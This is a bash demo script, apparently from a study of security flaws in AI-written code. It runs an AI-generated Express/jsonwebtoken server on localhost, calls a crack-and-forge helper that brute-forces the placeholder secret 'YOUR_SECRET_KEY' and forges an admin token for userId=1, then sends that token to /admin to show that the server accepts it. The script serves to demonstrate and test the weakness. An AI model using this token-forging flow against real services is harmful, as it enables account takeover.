#!/usr/bin/env bash
# End-to-end demo for jwt_002 (Express, jsonwebtoken).
#
# Installs deps, starts the AI's middleware on port 3081, runs
# ../crack-and-forge.sh to crack 'YOUR_SECRET_KEY' and forge an admin
# token, then curls /admin with the forged token to show the server
# accepts it. Server is killed on exit.
#
# Usage:
#   ./run-demo.sh                  # default — uses SecLists wordlist
#   ./run-demo.sh ../wordlists/ai-placeholder-secrets.txt
#                                  # opt-in fast 20-entry wordlist

set -euo pipefail

cd "$(dirname "$0")"
SCRIPT_DIR="$(pwd)"
DEMO_DIR="$(cd .. && pwd)"
PORT=3081
WORDLIST="${1:-}"

# Install deps (Express + jsonwebtoken) on first run.
if [ ! -d node_modules ]; then
    echo "=== Step 0a: npm install (first run only) ==="
    npm install --silent
    echo "  ok"
    echo
fi

echo "=== Step 0b: start the AI's Express middleware on port $PORT ==="
node server.js > /tmp/jwt_002_server.log 2>&1 &
SERVER_PID=$!
trap "kill $SERVER_PID 2>/dev/null || true" EXIT

# Wait for the server to be listening.
for _ in $(seq 1 20); do
    # Without a token the AI's middleware returns 403 with "No token provided." —
    # any HTTP response means it's up.
    if curl -s "http://127.0.0.1:$PORT/admin" | grep -q "No token provided"; then
        break
    fi
    sleep 0.1
done
echo "  server PID: $SERVER_PID (will stop on script exit)"
echo

echo "=== Step 1: crack the placeholder secret + forge an admin token ==="
if [ -n "$WORDLIST" ]; then
    CRACK_OUTPUT="$("$DEMO_DIR/crack-and-forge.sh" jwt_002 "$WORDLIST")"
else
    CRACK_OUTPUT="$("$DEMO_DIR/crack-and-forge.sh" jwt_002)"
fi
echo "$CRACK_OUTPUT" | sed 's/^/  /'
echo

FORGED="$(echo "$CRACK_OUTPUT" | awk '/Forged admin token:/{getline; gsub(/^ +/, ""); print; exit}')"
if [ -z "$FORGED" ]; then
    echo "Error: could not extract forged token from crack-and-forge output." >&2
    exit 2
fi

echo "=== Step 2: send the forged token to the AI's /admin endpoint ==="
echo "  curl -H \"Authorization: <forged>\" http://127.0.0.1:$PORT/admin"
echo "  response:"
curl -s -H "Authorization: $FORGED" "http://127.0.0.1:$PORT/admin" | sed 's/^/    /'
echo
echo

echo "=== Done ==="
echo "The AI's middleware verified the forged signature with the placeholder"
echo "secret and returned AUTHENTICATED ADMIN ACCESS for userId=1 — the"
echo "original admin account. The captured sample token belonged to userId=99"
echo "(a normal user). The signature was 'valid' because we forged it with the"
echo "same weak secret the server uses to verify."
